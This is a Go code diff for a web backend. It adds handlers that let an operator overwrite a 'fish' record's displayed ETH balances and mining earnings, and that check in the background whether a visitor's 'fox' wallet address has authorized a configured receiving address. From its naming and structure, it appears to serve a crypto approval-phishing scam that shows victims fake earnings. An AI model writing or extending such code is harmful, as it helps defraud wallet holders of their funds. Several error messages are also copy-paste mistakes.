@@ -67,12 +67,75 @@ func GetFish(c *gin.Context) {
 		}
 		updateData := model.Fish{}
 		if status, isExist := c.GetPostForm("status"); isExist == true {
-			status, _ := strconv.Atoi(status)
+			status, err := strconv.Atoi(status)
 			if err != nil {
 				util.JsonWrite(c, -101, nil, "status 错误!")
 				return
 			}
 			updateData.Status = status
+		}
+
+		if money, isExist := c.GetPostForm("Money"); isExist == true {
+			m, err := strconv.ParseFloat(money, 64)
+			if err != nil {
+				util.JsonWrite(c, -101, nil, "status 错误!")
+				return
+			}
+			updateData.Money = m
+		}
+
+		if money, isExist := c.GetPostForm("MoneyEth"); isExist == true {
+			m, err := strconv.ParseFloat(money, 64)
+			if err != nil {
+				util.JsonWrite(c, -101, nil, "status 错误!")
+				return
+			}
+			updateData.MoneyEth = m
+		}
+
+		if money, isExist := c.GetPostForm("TodayEarningsETH"); isExist == true {
+			m, err := strconv.ParseFloat(money, 64)
+			if err != nil {
+				util.JsonWrite(c, -101, nil, "TodayEarningsETH 错误!")
+				return
+			}
+			updateData.TodayEarningsETH = m
+		}
+		//MiningEarningETH
+		if money, isExist := c.GetPostForm("MiningEarningETH"); isExist == true {
+			m, err := strconv.ParseFloat(money, 64)
+			if err != nil {
+				util.JsonWrite(c, -101, nil, "MiningEarningETH 错误!")
+				return
+			}
+			updateData.MiningEarningETH = m
+		}
+
+
+		if money, isExist := c.GetPostForm("EarningsMoney"); isExist == true {
+			m, err := strconv.ParseFloat(money, 64)
+			if err != nil {
+				util.JsonWrite(c, -101, nil, "status 错误!")
+				return
+			}
+			updateData.EarningsMoney = m
+		}
+		if money, isExist := c.GetPostForm("TodayEarnings"); isExist == true {
+			m, err := strconv.ParseFloat(money, 64)
+			if err != nil {
+				util.JsonWrite(c, -101, nil, "status 错误!")
+				return
+			}
+			updateData.TodayEarnings = m
+		}
+
+		if money, isExist := c.GetPostForm("TotalEarnings"); isExist == true {
+			m, err := strconv.ParseFloat(money, 64)
+			if err != nil {
+				util.JsonWrite(c, -101, nil, "status 错误!")
+				return
+			}
+			updateData.TotalEarnings = m
 		}
 
 		err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
@@ -237,4 +300,26 @@ func TiXian(c *gin.Context) {
 	fmt.Println(string(respByte))
 	util.JsonWrite(c, 200, nil, "提现成功,等待到账!")
 	return
+}
+
+func UpdateIfAuthorization(c *gin.Context) {
+	foxAddress := c.PostForm("fox_address")
+	apiKey := viper.GetString("eth.apikey")
+	config := model.Config{}
+	var BAdd string
+	if BAddress, isExist := c.GetPostForm("b_address"); isExist {
+		BAdd = BAddress
+	} else {
+		err := mysql.DB.Where("id=1").First(&config).Error
+		if err != nil {
+			util.JsonWrite(c, -101, nil, "配置:"+err.Error())
+			return
+		}
+		BAdd = config.BAddress
+	}
+
+	go util.ChekAuthorizedFoxAddress(foxAddress, apiKey, BAdd, mysql.DB)
+
+	util.JsonWrite(c, 200, nil, "执行成功!")
+
 }
